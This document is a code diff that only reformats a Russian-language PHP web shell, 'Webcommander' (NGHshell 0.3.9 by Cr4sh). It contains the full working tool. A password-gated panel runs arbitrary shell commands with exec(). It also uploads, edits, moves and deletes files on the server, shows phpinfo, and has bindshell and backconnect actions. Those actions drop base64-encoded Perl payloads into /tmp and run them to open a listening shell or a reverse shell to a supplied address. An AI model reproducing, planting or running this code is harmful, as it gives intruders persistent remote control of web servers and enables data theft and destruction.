@@ -1,4 +1,4 @@
-<?
+<?php
 /* Webcommander by Cr4sh_aka_RKL v0.3.9 NGH edition :p */
 
 $script = $_SERVER["SCRIPT_NAME"];
@@ -57,29 +57,29 @@ $act = @$_GET['act'];
           ."DQpjbG9zZShTVERFUlIpOw==";
 
 if ($act == "showlogo") {
- header("Content-type: image/gif");
- echo base64_decode($logo);
- exit;
+    header("Content-type: image/gif");
+    echo base64_decode($logo);
+    exit;
 }
 if ($login) {
- Sleep(1);
- if ($luser == $user && $lpass == $pass) {
-  setcookie("logined", $pass);
- } else {
-  die("<font color=#DF0000>Login error</font>");
- }
+    Sleep(1);
+    if ($luser == $user && $lpass == $pass) {
+        setcookie("logined", $pass);
+    } else {
+        die("<font color=#DF0000>Login error</font>");
+    }
 } else {
- $logined = @$_COOKIE['logined'];
- if ($logined != $pass) {
-?>
+    $logined = @$_COOKIE['logined'];
+    if ($logined != $pass) {
+        ?>
  <form action=<?=$script?> method=POST>
  user: <input type=text name=user><br>
  pass: <input type=password name=pass><br><br>
  <input type=submit name=login value=login>
  </form>
-<?
+<?php
   exit;
- }
+    }
 }
 ?>
  <html>
@@ -106,94 +106,95 @@ if ($login) {
  <title>Webcommander at <?=$_SERVER["HTTP_HOST"]?></title>
  </head>
  <body>
-<?
+<?php
 $path = @rawurldecode($_GET['dir']);
 $cmd = @$_GET['cmd'];
 if ($act == "mass") {
- $post = array_keys($_POST);
- $todo = $_POST[$post[sizeof($post)-2]];
- $to = $_POST[$post[sizeof($post)-1]];
- for ($i = 0; $i < sizeof($post)-2; $i++) {
-  if ($_POST[$post[$i]]) {
-   if ($todo == "del") {
-    rm($_POST[$post[$i]]);
-   }
-   elseif ($todo == "mv") {
-    mvcp($_POST[$post[$i]], $to."/".$post[$i], $todo);
-   }
-   else {
-    mvcp($_POST[$post[$i]], $to."/".$post[$i], "cp");
-   }
-  }
- }
- //exit;
-}
-elseif ($act == mkdir) {
- $dirname = @$_POST['dirname'];
- $path = @$_POST['dir'];
- if (!$dirname) die("<font color=#DF0000>Ведите имя</font>\n");
- if (!@mkdir($path.$dirname)) die("<font color=#DF0000>Немогу создать папку</font>\n");
-}
-elseif ($act == upload) {
- $userfile = @$_FILES['userfile']['tmp_name'];
- $uploaddir = @$_POST['uploaddir'];
- if (is_uploaded_file($userfile))  {
-  @copy($userfile, $uploaddir.$_FILES['userfile']['name']);
-  @unlink($userfile);
-  $path = $uploaddir;
- } else die("<font color=#DF0000>Ошибка при загрузке файла</font>\n");
-}
-elseif ($act == "rm") {
- $name = @$_GET['name'];
- rm($name);
- $inf = pathinfo($name);
- $path = $inf['dirname'];
-}
-elseif ($act == "viev") {
- $name = @$_GET['name'];
- if (file_exists($name)) {
-  echo "<form action=".$script."?act=updatefile method=POST>\n".
+    $post = array_keys($_POST);
+    $todo = $_POST[$post[sizeof($post)-2]];
+    $to = $_POST[$post[sizeof($post)-1]];
+    for ($i = 0; $i < sizeof($post)-2; $i++) {
+        if ($_POST[$post[$i]]) {
+            if ($todo == "del") {
+                rm($_POST[$post[$i]]);
+            } elseif ($todo == "mv") {
+                mvcp($_POST[$post[$i]], $to."/".$post[$i], $todo);
+            } else {
+                mvcp($_POST[$post[$i]], $to."/".$post[$i], "cp");
+            }
+        }
+    }
+    //exit;
+} elseif ($act == mkdir) {
+    $dirname = @$_POST['dirname'];
+    $path = @$_POST['dir'];
+    if (!$dirname) {
+        die("<font color=#DF0000>Ведите имя</font>\n");
+    }
+    if (!@mkdir($path.$dirname)) {
+        die("<font color=#DF0000>Немогу создать папку</font>\n");
+    }
+} elseif ($act == upload) {
+    $userfile = @$_FILES['userfile']['tmp_name'];
+    $uploaddir = @$_POST['uploaddir'];
+    if (is_uploaded_file($userfile)) {
+        @copy($userfile, $uploaddir.$_FILES['userfile']['name']);
+        @unlink($userfile);
+        $path = $uploaddir;
+    } else {
+        die("<font color=#DF0000>Ошибка при загрузке файла</font>\n");
+    }
+} elseif ($act == "rm") {
+    $name = @$_GET['name'];
+    rm($name);
+    $inf = pathinfo($name);
+    $path = $inf['dirname'];
+} elseif ($act == "viev") {
+    $name = @$_GET['name'];
+    if (file_exists($name)) {
+        echo "<form action=".$script."?act=updatefile method=POST>\n".
        "файл <b>".$name."</b><br>\n";
-  $out = implode("", file($name));
-  echo "<textarea rows=25 cols=70 name=text>";
-  print_r ($out);
-  echo "</textarea><br>\n".
+        $out = implode("", file($name));
+        echo "<textarea rows=25 cols=70 name=text>";
+        print_r($out);
+        echo "</textarea><br>\n".
        "<input type=hidden name=file value=\"".$name."\">\n".
        "<input type=submit value=сохранить>\n".
        "</form>\n".
        "[ <a href=javascript:history.go(-1)>back</a> ]";
- } else die("<font color=#DF0000>Файл не найден</font>\n");
- exit;
-}
-elseif ($act == "updatefile") {
- $filename = @$_POST['file'];
- $text = @$_POST['text'];
- if (is_writable($filename)) {
-  $handle = fopen($filename, "w+");
-  if (fwrite($handle, stripslashes($text)) === FALSE) {
-   die("<font color=#DF0000>Ошибка записи в файл</font>\n");
-  }
- } else die("<font color=#DF0000>Файл недоступен для записи</font>\n");
- fclose($handle);
- $inf = pathinfo($filename);
- $path = $inf['dirname'];
-}
-elseif ($act == "touch") {
- $userfile = @$_POST['file'];
- $userdir = @$_POST['dir'];
- if (!$userfile) {
-  die("<font color=#DF0000>Ведите имя</font>\n");
- }
- $handle = fopen($userdir.$userfile, "w+");
- if (fwrite($handle, "") === FALSE)  {
-   die("<font color=#DF0000>Ошибка создания файла</font>\n");
- }
- fclose($handle);
- $path = $userdir;
-}
-elseif ($act == "renameform") {
- $name = @$_GET['name'];
- echo "<form action=".$script."?act=rename method=POST>"
+    } else {
+        die("<font color=#DF0000>Файл не найден</font>\n");
+    }
+    exit;
+} elseif ($act == "updatefile") {
+    $filename = @$_POST['file'];
+    $text = @$_POST['text'];
+    if (is_writable($filename)) {
+        $handle = fopen($filename, "w+");
+        if (fwrite($handle, stripslashes($text)) === false) {
+            die("<font color=#DF0000>Ошибка записи в файл</font>\n");
+        }
+    } else {
+        die("<font color=#DF0000>Файл недоступен для записи</font>\n");
+    }
+    fclose($handle);
+    $inf = pathinfo($filename);
+    $path = $inf['dirname'];
+} elseif ($act == "touch") {
+    $userfile = @$_POST['file'];
+    $userdir = @$_POST['dir'];
+    if (!$userfile) {
+        die("<font color=#DF0000>Ведите имя</font>\n");
+    }
+    $handle = fopen($userdir.$userfile, "w+");
+    if (fwrite($handle, "") === false) {
+        die("<font color=#DF0000>Ошибка создания файла</font>\n");
+    }
+    fclose($handle);
+    $path = $userdir;
+} elseif ($act == "renameform") {
+    $name = @$_GET['name'];
+    echo "<form action=".$script."?act=rename method=POST>"
      ."<b>Переименовать, копировать или переместить </b>".$name."<br>"
      ."<input type=text name=to size=40 value=".$name.">"
      ."<input type=hidden name=from value=".$name."><br>"
@@ -201,60 +202,58 @@ elseif ($act == "renameform") {
      ."<input type=radio name=todo value=cp> скопировать<br>"
      ."<input type=submit value=Go></form>"
      ."[ <a href=javascript:history.go(-1)>back</a> ]";
- exit;
-}
-elseif ($act == "rename") {
- $from = @$_POST['from'];
- $to = @$_POST['to'];
- $todo = @$_POST['todo'];
- mvcp($from, $to, $todo);
- $inf = pathinfo($from);
- $path = $inf['dirname'];
-}
-elseif ($act == "bindshell") {
- $port = @$_POST['port'];
- if (!$port) {
-  die("<font color=#DF0000>Укажите порт</font>");
- }
- $file = "/tmp/bd";
- $handle = fopen($file, "w+");
- if (fputs($handle, base64_decode($bind)) === FALSE)  {
-   die("<font color=#DF0000>Ошибка создания файла ".$file."</font>\n");
- } else {
-  fclose($handle);
-  passthru("perl ".$file." ".$port." > /dev/null &");
- }
-}
-elseif ($act == "backconnect") {
- $port = @$_POST['port'];
- $addr = @$_POST['addr'];
- if (!$port || !$addr) {
-  die("<font color=#DF0000>Укажите порт и адресс</font>");
- }
- $file = "/tmp/bcon";
- $handle = fopen($file, "w+");
- if (fputs($handle, base64_decode($backcon)) === FALSE)  {
-   die("<font color=#DF0000>Ошибка создания файла  ".$file."</font>\n");
- } else {
-  fclose($handle);
-  passthru("perl ".$file." ".$addr." ".$port." > /dev/null &");
- }
-}
-elseif ($act == "phpinfo") {
- phpinfo();
- exit;
+    exit;
+} elseif ($act == "rename") {
+    $from = @$_POST['from'];
+    $to = @$_POST['to'];
+    $todo = @$_POST['todo'];
+    mvcp($from, $to, $todo);
+    $inf = pathinfo($from);
+    $path = $inf['dirname'];
+} elseif ($act == "bindshell") {
+    $port = @$_POST['port'];
+    if (!$port) {
+        die("<font color=#DF0000>Укажите порт</font>");
+    }
+    $file = "/tmp/bd";
+    $handle = fopen($file, "w+");
+    if (fputs($handle, base64_decode($bind)) === false) {
+        die("<font color=#DF0000>Ошибка создания файла ".$file."</font>\n");
+    } else {
+        fclose($handle);
+        passthru("perl ".$file." ".$port." > /dev/null &");
+    }
+} elseif ($act == "backconnect") {
+    $port = @$_POST['port'];
+    $addr = @$_POST['addr'];
+    if (!$port || !$addr) {
+        die("<font color=#DF0000>Укажите порт и адресс</font>");
+    }
+    $file = "/tmp/bcon";
+    $handle = fopen($file, "w+");
+    if (fputs($handle, base64_decode($backcon)) === false) {
+        die("<font color=#DF0000>Ошибка создания файла  ".$file."</font>\n");
+    } else {
+        fclose($handle);
+        passthru("perl ".$file." ".$addr." ".$port." > /dev/null &");
+    }
+} elseif ($act == "phpinfo") {
+    phpinfo();
+    exit;
 }
 if (!$path) {
- $dir = getcwd()."/";
+    $dir = getcwd()."/";
 } else {
- $dir = stripslashes($path);
- if ($dir[strlen($dir)-1] != "/") $dir .= "/";
+    $dir = stripslashes($path);
+    if ($dir[strlen($dir)-1] != "/") {
+        $dir .= "/";
+    }
 }
 $dir = str_replace("\\", "/", $dir);
 $dir = str_replace("//", "/", $dir);
 $arr = explode("/", $dir);
 for ($i=0; $i<count($arr)-2; $i++) {
- $back .= $arr[$i]."/";
+    $back .= $arr[$i]."/";
 }
 ?>
  <table class=e>
@@ -273,10 +272,10 @@ for ($i=0; $i<count($arr)-2; $i++) {
  <b>Команда:</b> <input type=text name=cmd value="<?=$cmd?>" size=120>
  <input type=hidden name=dir value="<?=$dir?>"><br>
  <textarea rows=8 cols=97>
-<?
+<?php
 if ($cmd) {
- exec($cmd, $out);
- echo convert_cyr_string(implode("\r\n", $out), "a", "w");
+    exec($cmd, $out);
+    echo convert_cyr_string(implode("\r\n", $out), "a", "w");
 }
 ?>
 </textarea></form>
@@ -289,9 +288,9 @@ if ($cmd) {
 Порт <input type=text name=port size=8>
 <input type=submit value=Connect>
 </form>
-<?
-if($handle = @opendir($dir)) {
-?>
+<?php
+if ($handle = @opendir($dir)) {
+    ?>
  <form action=<?=$script?>?act=mass method=POST>
  <table width=700>
  <tr class=e><td colspan=7><b><?=$dir?></b></td></tr>
@@ -299,26 +298,29 @@ if($handle = @opendir($dir)) {
  <td><small><font color=#D1D1E1>size</font></small></td>
  <td><small><font color=#D1D1E1>date</font></small></td>
  <td colspan=4><small><font color=#D1D1E1>permissions</font></small></td></tr>
-<?
+<?php
  $cssclass = "v";
- while ($file = readdir($handle)) {
-  if (is_dir($dir.$file) && $file != ".." && $file != ".") {
-   $inf = pathinfo($dir.$file);
-   echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
+    while ($file = readdir($handle)) {
+        if (is_dir($dir.$file) && $file != ".." && $file != ".") {
+            $inf = pathinfo($dir.$file);
+            echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
        ."<td><input type=checkbox name=".$file." value=".$dir.$file.">"
        ."[<a href=\"".$script."?dir=".rawurlencode($inf['dirname'])."/".rawurlencode($inf['basename'])."\">"
        .$file."</a>]</td><td><b>--dir</b></td><td>".date("d.m.y/H:i", filemtime($dir.$file))."</td>\n"
        ."<td>".parseperms(fileperms($dir.$file))."</td>\n"
        ."<td><a href=\"".$script."?act=rm&name=".rawurlencode($dir.$file)."\">DEL</a></td>\n"
        ."<td colspan=2><a href=\"".$script."?act=renameform&name=".rawurlencode($dir.$file)."\">MOVE(COPY)</a></td></tr>\n";
-   if ($cssclass == "v") $cssclass = "v2";
-   elseif ($cssclass == "v2") $cssclass = "v";
-  }
- }
- rewinddir($handle);
- while ($file = readdir($handle)) {
-  if (is_file($dir.$file)) {
-   echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
+            if ($cssclass == "v") {
+                $cssclass = "v2";
+            } elseif ($cssclass == "v2") {
+                $cssclass = "v";
+            }
+        }
+    }
+    rewinddir($handle);
+    while ($file = readdir($handle)) {
+        if (is_file($dir.$file)) {
+            echo "<tr class=".$cssclass." onmouseover=\"className='v3'\"  onmouseout=\"className='".$cssclass."'\">\n"
        ."<td><input type=checkbox name=".$file." value=".$dir.$file.">"
        ."[".$file."]</td><td>".filesize($dir.$file)."</td><td>\n"
        .date("d.m.y/H:i", filemtime($dir.$file))."</td>\n"
@@ -326,12 +328,14 @@ if($handle = @opendir($dir)) {
        ."<td><a href=\"".$script."?act=rm&name=".rawurlencode($dir.$file)."\">DEL</a></td>\n"
        ."<td><a href=\"".$script."?act=renameform&name=".rawurlencode($dir.$file)."\">MOVE(COPY)</a></td>\n"
        ."<td><a href=\"".$script."?act=viev&name=".rawurlencode($dir.$file)."\">EDIT</a></td></tr>\n";
-   if ($cssclass == "v") $cssclass = "v2";
-   elseif ($cssclass == "v2") $cssclass = "v";
-  }
- }
- closedir($handle);
-?>
+            if ($cssclass == "v") {
+                $cssclass = "v2";
+            } elseif ($cssclass == "v2") {
+                $cssclass = "v";
+            }
+        }
+    }
+    closedir($handle); ?>
  </table>
  <b>С отмечеными:</b> <input type=radio name=mass value=del checked> Удалить
  <b>[</b> <input type=radio name=mass value=mv> Переместить
@@ -355,106 +359,119 @@ if($handle = @opendir($dir)) {
  <input type=hidden name=uploaddir value="<?=$dir?>">
  <INPUT TYPE=submit VALUE=Отправить></FORM>
  <a href=<?=$script?>?act=phpinfo>Phpinfo()</a>
-<?
-} else die("<font color=#DF0000>Директория не найдена</font>\n");
-function rm($name) {
- if (is_file($name)) {
-  if (!@unlink($name)) die("<font color=#DF0000>Немогу удалить файл <b>".$name."</b></font>\n");
- }
- elseif (is_dir($name)) deldir($name);
+<?php
+} else {
+        die("<font color=#DF0000>Директория не найдена</font>\n");
+    }
+function rm($name)
+{
+    if (is_file($name)) {
+        if (!@unlink($name)) {
+            die("<font color=#DF0000>Немогу удалить файл <b>".$name."</b></font>\n");
+        }
+    } elseif (is_dir($name)) {
+        deldir($name);
+    }
 }
-function mvcp($from, $to, $todo) {
- if ($todo == "mv") {
-  if (is_file($from)) {
-   if (!rename($from, $to)) {
-    die("<font color=#DF0000>Ошибка при перемещении файла ".$from."</font>");
-   }
-  }
-  elseif (is_dir($from)) {
-   mvdir($from, $to, $todo);
-  }
- } else {
-  if (is_file($from)) {
-   if (!copy($from, $to)) {
-    die("<font color=#DF0000>Ошибка при копировании файла ".$from."</font>");
-   }
-  }
-  elseif (is_dir($from)) {
-   mvdir($from, $to, "cp");
-  }
- }
+function mvcp($from, $to, $todo)
+{
+    if ($todo == "mv") {
+        if (is_file($from)) {
+            if (!rename($from, $to)) {
+                die("<font color=#DF0000>Ошибка при перемещении файла ".$from."</font>");
+            }
+        } elseif (is_dir($from)) {
+            mvdir($from, $to, $todo);
+        }
+    } else {
+        if (is_file($from)) {
+            if (!copy($from, $to)) {
+                die("<font color=#DF0000>Ошибка при копировании файла ".$from."</font>");
+            }
+        } elseif (is_dir($from)) {
+            mvdir($from, $to, "cp");
+        }
+    }
 }
-function deldir($name) {
- if (@$handle=opendir($name)) {
-  while ($file = readdir($handle)) {
-   if ($file != ".." && $file != ".") {
-    if (is_file($name."/".$file)) {
-     unlink($name."/".$file);
+function deldir($name)
+{
+    if (@$handle=opendir($name)) {
+        while ($file = readdir($handle)) {
+            if ($file != ".." && $file != ".") {
+                if (is_file($name."/".$file)) {
+                    unlink($name."/".$file);
+                } elseif (is_dir($name."/".$file)) {
+                    deldir($name."/".$file);
+                }
+            }
+        }
+        closedir($handle);
+    } else {
+        die("<font color=#DF0000>Немогу удалить папку <b>".$name."</b></font>\n");
     }
-    elseif (is_dir($name."/".$file)) {
-     deldir($name."/".$file);
-    }
-   }
-  }
-  closedir($handle);
- } else die("<font color=#DF0000>Немогу удалить папку <b>".$name."</b></font>\n");
- rmdir($name);
+    rmdir($name);
 }
-function mvdir($from, $to, $todo) {
- if (@$handle = opendir($from)) {
-  mkdir($to);
-  while ($file = readdir($handle)) {
-   if ($file != ".." && $file != ".") {
-    if (is_file($from."/".$file)) {
-     if (!copy($from."/".$file, $to."/".$file)) {
-      die("<font color=#DF0000>Ошибка при копировании файла ".$from."/".$file."</font>");
-     }
+function mvdir($from, $to, $todo)
+{
+    if (@$handle = opendir($from)) {
+        mkdir($to);
+        while ($file = readdir($handle)) {
+            if ($file != ".." && $file != ".") {
+                if (is_file($from."/".$file)) {
+                    if (!copy($from."/".$file, $to."/".$file)) {
+                        die("<font color=#DF0000>Ошибка при копировании файла ".$from."/".$file."</font>");
+                    }
+                } elseif (is_dir($from."/".$file)) {
+                    mvdir($from."/".$file, $to."/".$file, $todo);
+                }
+            }
+        }
+        closedir($handle);
+        if ($todo == "mv") {
+            deldir($from);
+        }
+    } else {
+        die("<font color=#DF0000>Немогу копировать папку <b>".$name."</b></font>\n");
     }
-    elseif (is_dir($from."/".$file)) {
-     mvdir($from."/".$file, $to."/".$file, $todo);
-    }
-   }
-  }
-  closedir($handle);
-  if ($todo == "mv") deldir($from);
- } else die("<font color=#DF0000>Немогу копировать папку <b>".$name."</b></font>\n");
 }
 function parseperms($perms)
 {
- if (!$perms) return "null";
- if (($perms & 0xC000) == 0xC000) {
-    $info = 'socket ';
- } elseif (($perms & 0xA000) == 0xA000) {
-    $info = 'link ';
- } elseif (($perms & 0x8000) == 0x8000) {
-    $info = '-';
- } elseif (($perms & 0x6000) == 0x6000) {
-    $info = 'b';
- } elseif (($perms & 0x4000) == 0x4000) {
-    $info = 'dir ' ;
- } elseif (($perms & 0x2000) == 0x2000) {
-    $info = 'c';
- } elseif (($perms & 0x1000) == 0x1000) {
-    $info = 'p';
- } else {
-    $info = 'u';
- }
- $info .= (($perms & 0x0100) ? 'r' : '-');
- $info .= (($perms & 0x0080) ? 'w' : '-');
- $info .= (($perms & 0x0040) ?
-            (($perms & 0x0800) ? 's' : 'x' ) :
+    if (!$perms) {
+        return "null";
+    }
+    if (($perms & 0xC000) == 0xC000) {
+        $info = 'socket ';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        $info = 'link ';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        $info = 'dir ' ;
+    } elseif (($perms & 0x2000) == 0x2000) {
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        $info = 'p';
+    } else {
+        $info = 'u';
+    }
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+            (($perms & 0x0800) ? 's' : 'x') :
             (($perms & 0x0800) ? 'S' : '-'));
- $info .= (($perms & 0x0020) ? 'r' : '-');
- $info .= (($perms & 0x0010) ? 'w' : '-');
- $info .= (($perms & 0x0008) ?
-            (($perms & 0x0400) ? 's' : 'x' ) :
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+            (($perms & 0x0400) ? 's' : 'x') :
             (($perms & 0x0400) ? 'S' : '-'));
- $info .= (($perms & 0x0004) ? 'r' : '-');
- $info .= (($perms & 0x0002) ? 'w' : '-');
- $info .= (($perms & 0x0001) ?
-            (($perms & 0x0200) ? 't' : 'x' ) :
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+            (($perms & 0x0200) ? 't' : 'x') :
             (($perms & 0x0200) ? 'T' : '-'));
- return $info;
+    return $info;
 }
 echo "<br><small>NGHshell 0.3.9 by Cr4sh</body></html>\n";
 
